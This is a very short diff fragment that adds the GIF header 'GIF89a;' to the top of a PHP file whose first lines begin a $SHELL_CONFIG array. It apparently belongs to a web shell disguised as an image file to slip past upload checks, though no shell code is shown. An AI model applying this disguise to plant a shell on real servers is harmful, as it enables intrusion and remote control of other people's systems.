@@ -1,3 +1,4 @@
+GIF89a;
 <?php
 
 $SHELL_CONFIG = array(
